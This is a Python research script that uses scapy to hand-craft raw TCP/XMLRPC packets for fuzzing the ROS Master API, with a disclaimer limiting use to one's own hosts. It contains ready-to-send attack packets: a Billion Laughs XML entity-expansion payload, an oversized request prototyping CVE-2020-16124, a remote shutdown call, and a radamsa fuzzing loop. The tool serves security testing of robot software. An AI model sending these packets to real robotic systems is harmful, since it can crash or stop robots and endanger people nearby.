"""
Fuzz testing ROS networking

DISCLAIMER: Use against your own hosts only! By no means I encourage or promote the unauthorized tampering
with running robotic systems. This can cause serious human harm and material
damages.
"""

from fuzzingbook.Fuzzer import RandomFuzzer
import sys
import random
from datetime import datetime
from subprocess import Popen, PIPE
from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
from scapy.layers.http_client import HTTPClient
from scapy.layers.l2 import Ether
from scapy.contrib.tcpros import *

# bind layers so that packages are recognized as TCPROS
bind_layers(TCP, TCPROS)
bind_layers(HTTPRequest, XMLRPC)
bind_layers(HTTPResponse, XMLRPC)
# bind_layers(HTTPROSRequest, XMLRPC)
# bind_layers(HTTPROSResponse, XMLRPC)

"""
Short summary of how this was developed:

1. The corresponding command was shipped while scapy was monitoring the network:
    packages = sniff(iface="eth0", filter="tcp")

2. Packages captured correspond with:

    >>> packages.show()
    0000 Ether / IP / TCP 12.0.0.4:48098 > 12.0.0.2:11311 S
    0001 Ether / IP / TCP 12.0.0.2:11311 > 12.0.0.4:48098 SA
    0002 Ether / IP / TCP 12.0.0.4:48098 > 12.0.0.2:11311 A
    0003 Ether / IP / TCP 12.0.0.4:48098 > 12.0.0.2:11311 PA / TCPROS / Raw
    0004 Ether / IP / TCP 12.0.0.2:11311 > 12.0.0.4:48098 A
    0005 Ether / IP / TCP 12.0.0.2:11311 > 12.0.0.4:48098 PA / TCPROS / Raw
    0006 Ether / IP / TCP 12.0.0.4:48098 > 12.0.0.2:11311 A
    0007 Ether / IP / TCP 12.0.0.4:48098 > 12.0.0.2:11311 FA
    0008 Ether / IP / TCP 12.0.0.2:11311 > 12.0.0.4:48098 FA
    0009 Ether / IP / TCP 12.0.0.4:48098 > 12.0.0.2:11311 A

Note that binding the TCPROS layer to TCP results into the dissector kicking in
and interpreting the packages accordingly.

3. Reproducing the interaction by generating ".command()" for each one of the
relevant packages:

    >>> packages[0].command()
    "Ether(dst='02:42:0c:00:00:02', src='02:42:0c:00:00:04', type=2048)/IP(version=4, ihl=5, tos=0, len=60, id=24918, fla
    gs=2, frag=0, ttl=64, proto=6, chksum=49504, src='12.0.0.4', dst='12.0.0.2')/TCP(sport=48098, dport=11311, seq=318660
    7024, ack=0, dataofs=10, reserved=0, flags=2, window=65048, chksum=6196, urgptr=0, options=[('MSS', 1384), ('SAckOK',
     b''), ('Timestamp', (1859734885, 0)), ('NOP', None), ('WScale', 7)])"

From this we produced a valid/reduced version that can be used in a script:

    p_attack = IP(version=4, frag=0, ttl=64,
            proto=6, dst='12.0.0.2')/TCP(sport=48099,
            dport=11311, seq=0, ack=0, flags=2)

We continue doing something similar with the rest of the packages.

"""

###################################################################################
# VARIABLES
###################################################################################

radamsa_bin = "/usr/bin/radamsa"
FUZZ_FACTOR = 20.0
source = "14.0.0.4"  # for some reason, I'm unable to get a different source
# or even its own.

random.seed(datetime.now())

# default package to execute "rosparam get /rosdistro"
package_rosparam_get_rosdistro = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="12.0.0.2")
    / TCP(
        sport=20000,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"getParam",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>/rosdistro</string></value>\n</param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)

package_rosparam_get_rosdistro_long = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="12.0.0.2")
    / TCP(
        sport=20000,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"getParam",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rosparam----18446744073709551616</string></value>\n</param><param>\n</param><param><param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<param>\n<value><string>/rosdistro</string></value>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param>\n</param></param><param></param><param></param>\n<param></param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)

# default package to execute "getPid" method of Master API
package_getPid = (
    IP(version=4, ihl=5, tos=0, flags=2, frag=0, dst="12.0.0.2")
    / TCP(
        sport=20000,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"159",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"getPid",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rostopic</string></value>\n</param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)

package_shutdown = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="12.0.0.2")
    / TCP(
        sport=20001,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"shutdown",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>4L145_R080T1C5</string></value>\n</param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)

package_rosparam_get_missing_callerid = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="12.0.0.2")
    / TCP(
        sport=20000,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"getParam",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n</param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)

# TODO: proper process of this sort of packages
# requires TCP segment reassembly
# refer to https://gist.github.com/MarkBaggett/d8933453f431c111169158ce7f4e2222
package_rosparam_set_weird = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="12.0.0.2")
    / TCP(
        sport=20000,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"setParam",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>//rrrr\xca\xb3osdirrrosdttrrrrrrrrrrrrr\xe1\x85\x9frrrrrrrrrrrrro/srrrrrosdirrrosdittrrrrrrrrrrrrr\xe1\x85\x9frrrrrrrqrrrrrrrrrrrrrrrro/srrrrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrrrrrrsrrrrrrrrqrrrro/srrrrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrrrrrrsrrrrrrrrqrrrro/srrrrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrr\xe1\x85\x9frrrrrrrqrrrrrrrrrrrrrrrrro/srrrrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrr\xe1\x85\x9frrrrrrrqrrrrrrrrrrrrrrrrro/srrrrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrr\xe1\x85\x9frrrrrrrqrrrrrrrrrrrrrrrrro/srrrrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrr\xe1\x85\x9frrrrrrrqrrrrrrrrrrrrrrrrro/srrrrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrrrrrrsrrrrrrrrqrrrro/srrrrrosdirrrosri/drtotrrosdirrrosri/drtotrrosdjttrrrrrrrrrrrrrrrrrr\xe1\x85\x9frrrrrrrqrrrrrrrrr\xe2\x80\x8arrrrrrrro/srrrrrosdirrrosri/drtotrrosdjttrrrrrrsrrrrro/rrrosejttro</string></value>\n</param>\n<param>\n<value><string>m----3eeelme\xf0\x9f\x92\xa9lodic</string></value>\n</param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)

# Billion Laugh Attack
# XMML External Entity attack, valid in indigo and before
package_xxe = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="12.0.0.2")
    / TCP(
        sport=20000,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.0",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?><!DOCTYPE string [<!ENTITY a0 'dos' ><!ENTITY a1 '&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;'><!ENTITY a2 '&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;'><!ENTITY a3 '&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;'><!ENTITY a4 '&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;'><!ENTITY a5 '&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;'><!ENTITY a6 '&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;'><!ENTITY a7 '&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;'><!ENTITY a8 '&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;'> ]>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"getParam",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rosparam-924sdasds18</string></value>\n</param>\n<param>\n<value><string>/rosdistro &a8; </string></value>\n</param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)


# Prototypes CVE-2020-16124 / Integer overflow in ros_comm
package_integer_overflow = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="12.0.0.2")
    / TCP(
        sport=20000,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"12.0.0.2:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"getParam",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>"
        + b"/rosdistro"
        + b"a" * 64000
        + b"</string></value>\n</param>",
        # + b"</nextag></tag>\n",  # maxint 2147483647
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)

###################################################################################
# GENERAL FUNCTIONS
###################################################################################


def yellow(text):
    print("\033[33m", text, "\033[0m", sep="")


def red(text):
    print("\033[31m", text, "\033[0m", sep="")


def gray(text):
    print("\033[90m", text, "\033[0m", sep="")


def magenta(text):
    print("\033[35m", text, "\033[0m", sep="")


def mutate(payload):
    """
    Mutates data using radamsa binary.

    NOTE: FLAGS are hardcoded

    param: payload, binary (string b"") data to mutate
    returns: binary mutated data (string b"")
    """
    # try:
    radamsa = [radamsa_bin, "-n", "1", "-"]
    p = Popen(radamsa, stdin=PIPE, stdout=PIPE)
    mutated_data = p.communicate(payload)[0]
    # except:
    #     print("Could not execute 'radamsa'.")
    #     sys.exit(1)

    return mutated_data


def retry_and_report(package, iteration, timeout=2):
    """
    Retry sending a package and report if fails
    """
    ans = sr(package, timeout=timeout)
    gray(package)
    try:
        answered_package = ans[0][0]  # includes package sent, and answers
        # print(type(a))
        for p in list(answered_package):
            print(p.summary())
            yellow(p[HTTP])
    except IndexError as e:
        red("No answer received on iteration: " + str(iteration))
        retry_and_report(package, iteration + 1)


def log_events(log_info, type_event):
    """
    Log events for post-analysis

    param log_info, scapy package
    param type_event: str, either "fuzzing", "weird" or "error"
    """

    log_msg = (
        "["
        + time.ctime()
        + "]"
        + "\n\n"
        + log_info.command()
        + "\n\n"
        + raw(log_info).decode("iso-8859-1")
    )
    # log_msg_encoded = log_info

    if type_event == "fuzzing":
        try:
            fd = open("fuzz.log", "a")
        except IOError as err:
            return "[!] Error opening log file: %s" % str(err)

    elif type_event == "error":
        try:
            fd = open("error.log", "a")
        except IOError as err:
            return "[!] Error opening error file: %s" % str(err)

    elif type_event == "weird":
        try:
            fd = open("weird.log", "a")
        except IOError as err:
            return "[!] Error opening error file: %s" % str(err)

    else:
        return "[!] '%s' is an unrecognized log event type." % type_event

    if fd:
        fd.write(log_msg)

    return


def preamble():
    """
    ROS XMLRPC preamble

    returns: bool, indicating if successful
    """
    # send the SYN, receive response
    p_attack = IP(version=4, frag=0, ttl=64, proto=6, dst="12.0.0.2") / TCP(
        sport=origin_port, dport=11311, seq=0, ack=0, flags=2
    )
    ans = sr1(p_attack, retry=0, timeout=1)
    # ans = srp1(p_attack, retry=0, timeout=1)

    if ans and len(ans) > 0 and ans[TCP].flags == "SA":
        # print(ans.summary())  # debug
        # ls(ans)  # debug

        # send the ACK
        p_attack = IP(
            version=4, ihl=5, flags=2, frag=0, ttl=64, proto=6, dst="12.0.0.2"
        ) / TCP(
            sport=origin_port,
            dport=11311,
            flags=16,
            seq=ans[TCP].ack,
            ack=ans[TCP].seq + 1,
        )
        send(p_attack)
        return True, ans
    else:
        return False, ans


def process_xmlrpc_response(p_attack, ans, unans, field_name=None):
    """
    Abstracts how the different functions process the XMLRPC responses
    for logging and analysis purposes.

    param p_attack: package used during the attack
    param ans: first result from scapy sr
    param uans: second result from scapy sr
    param field_name: field_name to consider when logging/evaluating

    Essentially:
    1. makes sure that there's an answer
    2. fetches the field to evaluate (or None)
    3. Checks results and responses and logs accordingly
    """

    # check if there's been an answer at all
    if len(ans) > 0:
        # ans.show()  # debug
        # print(list(ans[0][1])[0][XMLRPC])  # debug
        # print(ans[0][1][1][XMLRPC])  # debug

        response = list(ans[0][1])[0]
        if response == None:
            red("response None")

        # give it some colour for visual debugging:
        # print(response[XMLRPC])

        # print(response)  # debug
        # print(type(response))  # debug
        # print(b"Error" in response)  # debug
        # print(b"Error" in raw(response))  # debug

        field_evaluated = getattr(p_attack, field_name)

        if (
            b"Error" in raw(response)
            or b"is not set" in raw(response)
            or b"Exception" in raw(response)
            or b"missing required caller_id" in raw(response)
        ):
            red(response[XMLRPC])
            if not field_evaluated in errors_list:
                log_events(p_attack[XMLRPC], "error")
                errors_list.append(field_evaluated)

        # params, /rosdistro
        elif (
            b"melodic" in raw(response)  # hardcoded for testing setup
            and b"<int>1</int>" in raw(response)
            and field_name == "params"
        ):
            yellow(response[XMLRPC])
            if not field_evaluated in valid_list:
                log_events(p_attack[XMLRPC], "fuzzing")
                valid_list.append(field_evaluated)

        # params, setParam
        elif (
            b"parameter" in raw(response)  # hardcoded for testing setup
            and b"<int>1</int>" in raw(response)
            and b"set" in raw(response)
            # and b"<int>0</int>" in raw(response)
            and field_name == "params"
        ):
            yellow(response[XMLRPC])
            if not field_evaluated in valid_list:
                log_events(p_attack[XMLRPC], "fuzzing")
                valid_list.append(field_evaluated)

        # getPid
        elif b"<int>1</int>" in raw(response) and field_name == "methodname":
            yellow(response[XMLRPC])
            if not field_evaluated in valid_list:
                log_events(p_attack[XMLRPC], "fuzzing")
                valid_list.append(field_evaluated)

        else:
            #  something weird happened, review
            magenta(response[XMLRPC])
            if not field_evaluated in weird_list:
                log_events(p_attack[XMLRPC], "weird")
                weird_list.append(field_evaluated)

        #################
        # send the ACK so that we don't get spammed for retransmissions
        #################

        ack = IP(
            version=4, ihl=5, flags=2, frag=0, ttl=64, proto=6, dst="12.0.0.2"
        ) / TCP(
            sport=origin_port,
            dport=11311,
            flags=16,
            seq=response[TCP].ack,
            ack=len(response[TCP].payload) + response[TCP].seq,
        )
        send(ack)


###################################################################################
# ATTACKS
###################################################################################


def rosparam_get_rosdistro():
    """
    An auxiliary function to send a "rosparam get /rosdistro"

    Sending the following params:
        b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>/rosdistro</string></value>\n</param>\n"
    """
    success, ans = preamble()
    if success:

        # Using default packages
        p_attack = package_rosparam_get_rosdistro
        # p_attack = package_rosparam_get_missing_callerid
        # p_attack = package_rosparam_get_rosdistro_long
        # p_attack = package_xxe

        # default package to execute "rosparam get /rosdistro"
        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1

        # adjust size of XMLRPC package payload
        print(len(p_attack[HTTPRequest].payload))
        p_attack[HTTPRequest].Content_Length = str(
            len(p_attack[HTTPRequest].payload)
        ).encode("iso-8859-1")

        gray(p_attack[XMLRPC])  # debug sent package

        # # send and receive potentially huge packages
        # fragments = fragment(p_attack, 800)
        # print(len(fragments))
        # for f in fragments:
        #     send(f)
        #
        # ans = sniff(iface="eth0", filter="tcp", timeout=2)
        # print(ans.show())
        # # print(ans[0])
        # # print(ans[1])

        ans, unans = sr(p_attack, timeout=0.5)

        # process the response coherently and return ACK
        process_xmlrpc_response(p_attack, ans, unans, "params")


def getpid():
    """
    An auxiliary function to send a "rosparam get /rosdistro"
    request that includes fuzzed fields.
    """
    success, ans = preamble()
    if success:

        p_attack = package_getPid
        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1

        ans, unans = sr(p_attack)

        # process the response coherently and return ACK
        process_xmlrpc_response(p_attack, ans, unans, "methodname")


def rosparam_set_param():
    """
    An auxiliary function to send a "rosparam set /rosdistro whatever"
    """
    success, ans = preamble()
    if success:

        # Using default packages
        # p_attack = package_rosparam_get_rosdistro
        p_attack = package_rosparam_set_weird

        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1
        p_attack[XMLRPCCall].methodname = b"setParam"

        # # force setting it
        # params = "<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>/rosdistro</string></value>\n</param>\n<param>\n<value><string>whatever</string></value>\n</param>\n"
        # params = params.encode("iso-8859-1")
        # p_attack[XMLRPCCall].params = params

        # adjust size of XMLRPC package payload
        p_attack[HTTPRequest].Content_Length = str(
            len(p_attack[HTTPRequest].payload)
        ).encode("iso-8859-1")

        # debug output
        ans, unans = sr(p_attack, timeout=3)

        # process the response coherently and return ACK
        process_xmlrpc_response(p_attack, ans, unans, "params")


def shutdown():
    """
    Call the shutdown method from the external API defined as:

        Stop this server
        @param caller_id: ROS caller id
        @type  caller_id: str
        @param msg: a message describing why the node is being shutdown.
        @type  msg: str
        @return: [code, msg, 0]
        @rtype: [int, str, int]

    """
    success, ans = preamble()
    if success:

        # Using default packages
        p_attack = package_shutdown
        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1

        # adjust size of XMLRPC package payload
        p_attack[HTTPRequest].Content_Length = str(
            len(p_attack[HTTPRequest].payload)
        ).encode("iso-8859-1")

        # gray(p_attack[XMLRPC].params)  # debug package to send
        ans, unans = sr(p_attack, timeout=5)

        # process the response coherently and return ACK
        process_xmlrpc_response(p_attack, ans, unans, field_to_fuzz)


def rosparam_get_fuzzing(field_name="params"):
    """
    An auxiliary function to send a "rosparam get ..." while fuzzing

    Sending the following default params:
        b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>/rosdistro</string></value>\n</param>\n"
    """
    success, ans = preamble()
    if success:
        # Using default packages
        p_attack = package_rosparam_get_rosdistro
        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1

        # fuzzing
        field = random.choice(valid_list)  # randomly pick from the list of valid ones
        field_mutated = None
        while not field_mutated:
            if random.random() < FUZZ_FACTOR / 100:
                field_mutated = mutate(field)

        # set fuzzed value into the attack
        setattr(p_attack, field_name, field_mutated)

        # adjust size of XMLRPC package payload
        p_attack[HTTPRequest].Content_Length = str(
            len(p_attack[HTTPRequest].payload)
        ).encode("iso-8859-1")

        gray(p_attack[XMLRPC].params)  # debug package to send
        ans, unans = sr(p_attack, timeout=2)

        # process the response coherently and return ACK
        process_xmlrpc_response(p_attack, ans, unans, field_name)


def fuzz_XMLRPC():
    """
    Fuzz a whole XMLPRC package
    """
    success, ans = preamble()
    if success:

        # Using default packages
        p_attack = copy.deepcopy(package_rosparam_get_rosdistro)

        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1

        # fuzzing
        field = random.choice(valid_list)  # randomly pick from the list of valid ones
        field_mutated = None
        while not field_mutated:
            if random.random() < FUZZ_FACTOR / 100:
                field_mutated = mutate(field)

        # set fuzzed value into the attack
        p_attack[XMLRPCCall] = XMLRPCCall(field_mutated)

        # adjust size of XMLRPC package payload
        p_attack[HTTPRequest].Content_Length = str(
            len(p_attack[HTTPRequest].payload)
        ).encode("iso-8859-1")

        # debug output
        gray(p_attack[XMLRPC])
        ans, unans = sr(p_attack, timeout=3)

        # process the response coherently and return ACK
        process_xmlrpc_response(p_attack, ans, unans, "params")


def rosparam_set_param_fuzzing():
    """
    An auxiliary function to send a "rosparam set /something whatever"
    """
    success, ans = preamble()
    if success:

        # Using default packages
        p_attack = package_rosparam_get_rosdistro
        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1
        p_attack[XMLRPCCall].methodname = b"setParam"

        # fuzzing
        ## field_name
        field_name = random.choice(
            valid_list_name
        )  # randomly pick from the list of valid ones
        field_name_mutated = None
        while not field_name_mutated:
            if random.random() < FUZZ_FACTOR / 100:
                field_name_mutated = mutate(field_name)

        ## field_value
        field_value = random.choice(
            valid_list_value
        )  # randomly pick from the list of valid ones
        field_value_mutated = None
        while not field_value_mutated:
            if random.random() < FUZZ_FACTOR / 100:
                field_value_mutated = mutate(field_value)

        params_raw = (
            b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>/"
            + field_name_mutated
            + b"</string></value>\n</param>\n<param>\n<value><string>"
            + field_value_mutated
            + b"</string></value>\n</param>\n"
        )

        # params = params_raw.encode("iso-8859-1")
        params = params_raw

        # set fuzzed value into the attack
        # setattr(p_attack, "params", params)  # another way of doing it
        p_attack[XMLRPCCall].params = params

        # adjust size of XMLRPC package payload
        p_attack[HTTPRequest].Content_Length = str(
            len(p_attack[HTTPRequest].payload)
        ).encode("iso-8859-1")

        # debug output
        ans, unans = sr(p_attack, timeout=3)

        # process the response coherently and return ACK
        # check if there's been an answer at all
        if len(ans) > 0:
            # ans.show()  # debug
            # print(list(ans[0][1])[0][XMLRPC])  # debug
            # print(ans[0][1][1][XMLRPC])  # debug

            response = list(ans[0][1])[0]
            if response == None:
                red("response None")

            # give it some colour for visual debugging:
            # print(response[XMLRPC])

            # print(response)  # debug
            # print(type(response))  # debug
            # print(b"Error" in response)  # debug
            # print(b"Error" in raw(response))  # debug

            # in this case, we add to errors and weird the complete
            # params whereas to the valid, we seaprate in the two lists
            # for further combination exploration
            field_evaluated = params_raw

            if (
                b"Error" in raw(response)
                or b"is not set" in raw(response)
                or b"Exception" in raw(response)
            ):
                red(response[XMLRPC])
                if not field_evaluated in errors_list:
                    log_events(p_attack[XMLRPC], "error")
                    errors_list.append(field_evaluated)

            # params, setParam
            elif (
                b"parameter" in raw(response)  # hardcoded for testing setup
                and b"<int>1</int>" in raw(response)
                and b"set" in raw(response)
                and b"<int>0</int>" in raw(response)
            ):
                yellow(response[XMLRPC])
                # name
                if not field_name_mutated in valid_list_name:
                    log_events(p_attack[XMLRPC], "fuzzing")
                    valid_list_name.append(field_name_mutated)
                # value
                if not field_value_mutated in valid_list_value:
                    log_events(p_attack[XMLRPC], "fuzzing")
                    valid_list_value.append(field_value_mutated)

            else:
                #  something weird happened, review
                magenta(response[XMLRPC])
                if not field_evaluated in weird_list:
                    log_events(p_attack[XMLRPC], "weird")
                    weird_list.append(field_evaluated)

            #################
            # send the ACK so that we don't get spammed for retransmissions
            #################

            ack = IP(
                version=4, ihl=5, flags=2, frag=0, ttl=64, proto=6, dst="12.0.0.2"
            ) / TCP(
                sport=origin_port,
                dport=11311,
                flags=16,
                seq=response[TCP].ack,
                ack=len(response[TCP].payload) + response[TCP].seq,
            )
            send(ack)


###################################################################################
# CORE LOGIC
###################################################################################

# # ##############################
# # # fuzzing getParam
# # ##############################
# field_to_fuzz = "params"  # "methodname", "params"
# weird_list = []  # list containing weird/non-accounted responses
# errors_list = []  #  a list containing each
# # of the target fields of the fuzzing that leads to errors
#
# #  a list containing each of the target fields of the fuzzing
# # that leads to valid reponses, starts with one valid so that it can iterate
# valid_list = [
#     getattr(package_rosparam_get_rosdistro, field_to_fuzz),
#     # b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>/rosdistro</string></value>\n</param>\n"
#     # b"getParam"
#     # raw(package_rosparam_get_rosdistro[XMLRPCCall])
# ]
#
# while True:
#     origin_port = random.randint(1000, 65000)
#     rosparam_get_fuzzing(field_to_fuzz)
#     red("Error candidates: " + str(len(errors_list)))
#     yellow("Valid candidates: " + str(len(valid_list)))
#     magenta("Weird candidates: " + str(len(weird_list)))


# ##############################
# # fuzzing setParam
# ##############################
# weird_list = []  # list containing weird/non-accounted responses
